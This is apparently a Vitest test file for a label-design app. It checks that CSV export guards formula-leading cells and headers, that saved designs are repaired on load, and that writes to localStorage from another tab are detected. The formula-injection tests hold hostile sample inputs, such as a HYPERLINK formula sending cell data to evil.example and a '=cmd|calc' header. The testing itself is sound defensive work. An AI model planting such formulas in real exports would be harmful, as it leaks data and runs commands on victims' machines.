// @vitest-environment jsdom
/**
 * Findings S2 and D4 from the v1.0.18 full review.
 *
 *  S2  Two tabs on one origin share localStorage, and both the autosave and the saved-designs map are
 *      last-writer-wins with no lock. The second tab's work vanished with no message.
 *  D4  Exported CSV cells beginning with = + - @ are executed as formulas by Excel, LibreOffice and
 *      Google Sheets. Template rows can come from an imported design file, so a hostile .json can
 *      plant a formula that runs when the victim exports and opens the file.
 */
import { describe, it, expect, afterEach } from 'vitest';
import { parseCSV, toCSV, csvCell, stripFormulaGuard } from '../src/core/template/template';
import { isForeignWrite, onOtherTabWrite, startCrossTabWatch, KEYS } from '../src/core/storage/storage';

describe('D4: an exported cell cannot become a live spreadsheet formula', () => {
  it.each([
    '=HYPERLINK("http://evil.example/?"&A1,"click")',
    '=1+1',
    '+1+1',
    '-1-1',
    '@SUM(1)',
    '\tcmd',
    '\rcmd',
  ])('neutralises %j', (value) => {
    // The guard is an apostrophe immediately before the formula character. Comparing against the
    // literal value does not work once the value contains a quote, because CSV then doubles every
    // one of them — so compare against the same escaping csvCell applies.
    const cell = csvCell(value);
    const escaped = value.replace(/"/g, '""');
    expect(cell.includes(`'${escaped}`)).toBe(true);
  });

  it('leaves ordinary text, numbers and an empty cell alone', () => {
    expect(csvCell('Widget')).toBe('Widget');
    expect(csvCell('42')).toBe('42');
    expect(csvCell(42)).toBe('42');
    expect(csvCell(0)).toBe('0');        // a zero is a value, not an empty cell
    expect(csvCell(false)).toBe('false');
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
    // A formula character that is not first is just text.
    expect(csvCell('a=b')).toBe('a=b');
  });

  it('still quotes a cell that needs it', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line\nbreak')).toBe('"line\nbreak"');
  });

  it('the guard is removed on import, so a round trip is lossless', () => {
    for (const v of ['=1+1', '@x', '-1', 'plain', '42', '']) {
      expect(stripFormulaGuard(csvCell(v))).toBe(v);
    }
  });

  it('a full export-import cycle preserves the value', () => {
    const hostile = '=HYPERLINK("http://evil.example/?"&A1,"click")';
    const csv = toCSV(['Name', 'Note'], [{ Name: 'Widget', Note: hostile }] as never);
    // Never a bare formula in the file: a cell either opens with the guard or with a quote followed
    // by the guard.
    for (const line of csv.split('\n').slice(1)) {
      expect(line).not.toMatch(/,=["+\-@]/);
    }
    expect(csv).toContain(`"'${hostile.replace(/"/g, '""')}`);

    const back = parseCSV(csv);
    expect(back.errors).toEqual([]);
    expect(back.records[0].Note).toBe(hostile);        // and reads back as the original text
  });

  it('a plain export is byte-identical to what it was before', () => {
    // No formula characters in the data means no guard is added and nothing else changes.
    const csv = toCSV(['Name', 'Qty'], [{ Name: 'Bolt', Qty: 5 }] as never);
    expect(csv).toBe('Name,Qty\nBolt,5');
  });
});


describe('E3: the guard covers the header row, and a literal quote survives', () => {
  it('guards a header that would be a formula', () => {
    // Field names come from the design file, so an imported template controls them. The header row
    // used a plain CSV escaper and was the one row that reached Excel unguarded.
    const csv = toCSV(['=cmd|calc', 'Name'], [] as never);
    expect(csv).toBe("'=cmd|calc,Name");
    expect(csv.split('\n')[0]).not.toMatch(/^=/);
  });

  it('reads a guarded header back unchanged', () => {
    // Export and import have to agree about the guard on every row. Guarding headers on the way out
    // without stripping on the way in would have replaced the bug with its mirror image: a field
    // name would gain an apostrophe on every round trip and stop matching the template.
    const headers = ['=cmd', 'Name', 'a,b', '@handle'];
    expect(parseCSV(toCSV(headers, [] as never)).headers).toEqual(headers);
  });

  it('a value the user typed with a leading apostrophe round-trips', () => {
    // These came back edited. `'=SUM(1)` lost its quote, because import stripped any leading quote
    // followed by a formula character — including the user's own.
    for (const v of ["'=SUM(1)", "'-5", "'abc", "''", "'", "'@handle", "'+964"]) {
      expect(stripFormulaGuard(csvCell(v))).toBe(v);
    }
  });

  it('escapes a literal quote by doubling it, and undoes exactly one level', () => {
    expect(csvCell("'abc")).toBe("''abc");
    expect(stripFormulaGuard("''abc")).toBe("'abc");
    // The doubled form is tested first, so a value of just two quotes does not lose one per cycle.
    expect(stripFormulaGuard(csvCell("''"))).toBe("''");
  });

  it('a full cycle keeps a leading-quote value intact', () => {
    const v = "'=SUM(1)";
    const back = parseCSV(toCSV(['Note'], [{ Note: v }] as never));
    expect(back.errors).toEqual([]);
    expect(back.records[0].Note).toBe(v);
  });

  it('a header value the user typed with a leading quote also round-trips', () => {
    const headers = ["'=qty", 'Name'];
    expect(parseCSV(toCSV(headers, [] as never)).headers).toEqual(headers);
  });
});

describe('a damaged saved design is repaired on load, not handed to the renderer', () => {
  const storage = () => import('../src/core/storage/storage');

  const seed = (design: unknown) => {
    const map = new Map<string, string>();
    // jsdom's window.localStorage is a getter-only property, so it has to be redefined rather than
    // assigned. This is the same trick the other storage tests use.
    Object.defineProperty(globalThis, 'localStorage', {
      value: {
        getItem: (k: string) => map.get(k) ?? null,
        setItem: (k: string, v: string) => void map.set(k, v),
        removeItem: (k: string) => void map.delete(k),
      },
      configurable: true,
      writable: true,
    });
    map.set('phomymo_designs', JSON.stringify({ broken: design }));
  };

  it('a null labelSize is replaced rather than crashing the first render', async () => {
    // Proven by probe: displayLayout(null) throws "Cannot read properties of null (reading
    // 'width')", and store.loadDesign() put the null straight into state.
    seed({ elements: [{ id: 'e', type: 'text', text: 'x', x: 0, y: 0, width: 10, height: 10, rotation: 0 }], labelSize: null });
    const { loadDesign } = await storage();
    const d = loadDesign('broken');
    expect(d).not.toBeNull();
    expect(d!.labelSize).toEqual({ width: 40, height: 30 });
    // And the repaired design actually lays out.
    const { displayLayout } = await import('../src/core/render/layout');
    expect(() => displayLayout(d!.labelSize)).not.toThrow();
  });

  it('a missing labelSize gets the default too', async () => {
    seed({ elements: [{ id: 'e', type: 'text', text: 'x', x: 0, y: 0, width: 10, height: 10, rotation: 0 }] });
    const { loadDesign } = await storage();
    expect(loadDesign('broken')!.labelSize).toEqual({ width: 40, height: 30 });
  });

  it('a valid design comes back with its real size and elements intact', async () => {
    seed({
      elements: [{ id: 'e', type: 'text', text: 'x', x: 0, y: 0, width: 10, height: 10, rotation: 0 }],
      labelSize: { width: 60, height: 40, orientation: 'landscape' },
      savedAt: 1700000000000,
    });
    const { loadDesign } = await storage();
    const d = loadDesign('broken')!;
    expect(d.labelSize.width).toBe(60);
    expect(d.elements).toHaveLength(1);
    expect(d.savedAt).toBe(1700000000000);
  });

  it('a name that was never saved is still null', async () => {
    seed({ elements: [], labelSize: { width: 40, height: 30 } });
    const { loadDesign } = await storage();
    expect(loadDesign('nope')).toBeNull();
  });
});

describe('S2: another tab writing to localStorage is noticed', () => {
  afterEach(() => {
    // jsdom's window is shared across the file, so every listener must come off.
    stop?.();
  });
  let stop: (() => void) | undefined;

  it('recognises a write from another tab to a key that matters', () => {
    const ev = (key: string | null) => ({ key, storageArea: {} }) as StorageEvent;
    expect(isForeignWrite(ev(KEYS.AUTOSAVE))).toBe(true);
    expect(isForeignWrite(ev(KEYS.DESIGNS))).toBe(true);
    expect(isForeignWrite(ev(KEYS.SETTINGS))).toBe(true);
  });

  it('ignores a key that does not matter, and a null key', () => {
    const ev = (key: string | null) => ({ key, storageArea: {} }) as StorageEvent;
    expect(isForeignWrite(ev(KEYS.LANG))).toBe(false);
    expect(isForeignWrite(ev('something_else'))).toBe(false);
    expect(isForeignWrite(ev(null))).toBe(false);
  });

  it('ignores the storage-clear event, which reports no key', () => {
    // storageArea is null when storage is being cleared; that is not another tab overwriting work.
    expect(isForeignWrite({ key: null, storageArea: null } as unknown as StorageEvent)).toBe(false);
  });

  it('delivers a real storage event to a subscriber, and unsubscribes cleanly', () => {
    const seen: string[] = [];
    const off = onOtherTabWrite((k) => seen.push(k));
    const dispose = startCrossTabWatch();

    window.dispatchEvent(Object.assign(new Event('storage'), {
      key: KEYS.AUTOSAVE,
      storageArea: localStorage,
    }));

    expect(seen).toEqual([KEYS.AUTOSAVE]);

    off();
    dispose();
    window.dispatchEvent(Object.assign(new Event('storage'), {
      key: KEYS.AUTOSAVE,
      storageArea: localStorage,
    }));
    expect(seen).toEqual([KEYS.AUTOSAVE]);   // nothing after unsubscribing
  });
});